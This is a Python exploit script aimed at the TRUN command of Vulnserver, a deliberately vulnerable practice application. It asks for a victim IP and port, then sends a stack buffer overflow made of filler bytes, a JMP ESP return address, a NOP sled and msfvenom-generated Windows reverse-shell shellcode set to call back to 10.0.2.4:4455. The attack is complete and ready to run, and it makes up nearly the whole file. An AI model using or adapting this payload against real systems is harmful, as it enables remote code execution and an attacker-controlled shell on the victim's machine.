#!/usr/bin/env python3
print ("# #########################################")
print ("#  Fuzz TRUN instruction | Vulnserver   ####")
print ("#     PWNEDCR \x03  | Exploit Dev      ####")
print ("#           Exploit By r0r0x_xxx       ####")
print ("#           Date: 5-12-2020 	       ####")
print ("#       Simple Buffer Overflow   	   ####")
print ("###########################################")

#Banner

print (" _    _                         _    _            _    _             ")
print ("| |  | |                       | |  | |          | |  (_)            ")
print ("| |__| | __ _ _ __  _ __  _   _| |__| | __ _  ___| | ___ _ __   __ _ ")
print ("|  __  |/ _` | '_ \| '_ \| | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
print ("| |  | | (_| | |_) | |_) | |_| | |  | | (_| | (__|   <| | | | | (_| |")
print ("|_|  |_|\__,_| .__/| .__/ \__, |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
print ("             | |   | |     __/ |                                __/ |")
print ("             |_|   |_|    |___/                                |___/ ")


from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

timeout_val = 5 #seconds
host = input("Enter the victim ip address: ")
port = input("Enter the remote port of the victim: ")
victim = ((host, int(port)))

#badchars = \x00
#625011AF JMP ESP = \xAF\x11\x50\x62

payload = b""
payload += b"TRUN /.:/"
payload += b"\x41" * 2003
payload += b"\xAF\x11\x50\x62"
payload += b"\x90" * 20

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4455 -f python -b "\x00" -v payload
#Payload size: 351 bytes

payload += b"\xba\xb4\xec\xd2\xb3\xdb\xd3\xd9\x74\x24\xf4\x5e"
payload += b"\x31\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\xe2"
payload += b"\xe2\x30\x46\xf6\x13\x36\xa9\x06\xe4\x57\x23\xe3"
payload += b"\xd5\x57\x57\x60\x45\x68\x13\x24\x6a\x03\x71\xdc"
payload += b"\xf9\x61\x5e\xd3\x4a\xcf\xb8\xda\x4b\x7c\xf8\x7d"
payload += b"\xc8\x7f\x2d\x5d\xf1\x4f\x20\x9c\x36\xad\xc9\xcc"
payload += b"\xef\xb9\x7c\xe0\x84\xf4\xbc\x8b\xd7\x19\xc5\x68"
payload += b"\xaf\x18\xe4\x3f\xbb\x42\x26\xbe\x68\xff\x6f\xd8"
payload += b"\x6d\x3a\x39\x53\x45\xb0\xb8\xb5\x97\x39\x16\xf8"
payload += b"\x17\xc8\x66\x3d\x9f\x33\x1d\x37\xe3\xce\x26\x8c"
payload += b"\x99\x14\xa2\x16\x39\xde\x14\xf2\xbb\x33\xc2\x71"
payload += b"\xb7\xf8\x80\xdd\xd4\xff\x45\x56\xe0\x74\x68\xb8"
payload += b"\x60\xce\x4f\x1c\x28\x94\xee\x05\x94\x7b\x0e\x55"
payload += b"\x77\x23\xaa\x1e\x9a\x30\xc7\x7d\xf3\xf5\xea\x7d"
payload += b"\x03\x92\x7d\x0e\x31\x3d\xd6\x98\x79\xb6\xf0\x5f"
payload += b"\x7d\xed\x45\xcf\x80\x0e\xb6\xc6\x46\x5a\xe6\x70"
payload += b"\x6e\xe3\x6d\x80\x8f\x36\x21\xd0\x3f\xe9\x82\x80"
payload += b"\xff\x59\x6b\xca\x0f\x85\x8b\xf5\xc5\xae\x26\x0c"
payload += b"\x8e\xda\xb6\x0c\x4a\xb3\xb4\x10\x43\x24\x30\xf6"
payload += b"\x09\xba\x14\xa1\xa5\x23\x3d\x39\x57\xab\xeb\x44"
payload += b"\x57\x27\x18\xb9\x16\xc0\x55\xa9\xcf\x20\x20\x93"
payload += b"\x46\x3e\x9e\xbb\x05\xad\x45\x3b\x43\xce\xd1\x6c"
payload += b"\x04\x20\x28\xf8\xb8\x1b\x82\x1e\x41\xfd\xed\x9a"
payload += b"\x9e\x3e\xf3\x23\x52\x7a\xd7\x33\xaa\x83\x53\x67"
payload += b"\x62\xd2\x0d\xd1\xc4\x8c\xff\x8b\x9e\x63\x56\x5b"
payload += b"\x66\x48\x69\x1d\x67\x85\x1f\xc1\xd6\x70\x66\xfe"
payload += b"\xd7\x14\x6e\x87\x05\x85\x91\x52\x8e\xb5\xdb\xfe"
payload += b"\xa7\x5d\x82\x6b\xfa\x03\x35\x46\x39\x3a\xb6\x62"
payload += b"\xc2\xb9\xa6\x07\xc7\x86\x60\xf4\xb5\x97\x04\xfa"
payload += b"\x6a\x97\x0c"


if __name__ == "__main__":
    print: ('[*] Creating the Socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)

    try:
        print ('[*] Connecting to the windows VM')
        s.connect(victim)
        print('[*] Sending BOMB...')
        s.send(payload)
        print('[*]PWNED')
        s.close()
        
    except timeout:
        print ('[!] Socket timeout occurred, check the vulnserver app')
        print ('\check the debugger')
        exit(1)
        
    except error:
        print ('[!] The Socket does not work, Dude wake up!')
        exit(1)
        
        
            
   













